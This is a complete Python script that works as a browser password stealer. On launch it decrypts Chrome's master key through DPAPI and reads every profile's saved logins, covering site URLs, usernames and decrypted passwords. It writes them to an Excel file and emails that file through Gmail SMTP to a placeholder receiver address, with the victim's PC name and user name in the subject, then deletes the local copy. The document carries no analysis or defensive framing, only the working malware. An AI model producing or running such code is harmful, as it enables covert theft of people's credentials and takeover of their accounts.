import os
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import pandas as pd
import datetime
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import socket
import getpass

def get_chrome_datetime(chromedate):
    return datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=chromedate)

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""

def extract_chrome_passwords():
    key = get_encryption_key()
    user_data_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data")
    folders = os.listdir(user_data_path)
    folders = [folder for folder in folders if folder.startswith("Default") or folder.startswith("Profile")]
    data = []
    for folder in folders:
        login_data_path = os.path.join(user_data_path, folder, "Login Data")
        temp_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Temp", "Login Data")
        shutil.copyfile(login_data_path, temp_path)
        conn = sqlite3.connect(temp_path)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value, date_created, date_last_used FROM logins ORDER BY date_created")
        results = cursor.fetchall()
        for result in results:
            password = decrypt_password(result[2], key)
            created_date = get_chrome_datetime(result[3])
            last_used_date = get_chrome_datetime(result[4])
            data.append({
                "Folder": folder,
                "URL": result[0],
                "Username": result[1],
                "Password": password,
                "Created Date": created_date,
                "Last Used Date": last_used_date
            })
        conn.close()
        os.remove(temp_path)
    df = pd.DataFrame(data)
    df.to_excel("chrome_passwords.xlsx", index=False)
    send_email(df, folders)
    os.remove("chrome_passwords.xlsx")

def send_email(df, folders):
    sender_email = "sender@email.com" # Replace With Sender Email
    sender_email_password = "XXXX XXXX XXXX XXXX" # Replace With Sender Email's App Password
    receiver_email = "receiver@email.com" # Replace With Receiver Email 
    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    pc_name = socket.gethostname()
    username = getpass.getuser()
    message["Subject"] = f"Chrome Passwords - PC Name: {pc_name} - User: {username}"
    filename = "chrome_passwords.xlsx"
    attachment = open(filename, "rb")
    part = MIMEBase("application", "octet-stream")
    part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header("Content-Disposition", f"attachment; filename= {filename}")
    message.attach(part)
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(sender_email, sender_email_password)
    server.sendmail(sender_email, receiver_email, message.as_string())
    server.quit()

extract_chrome_passwords()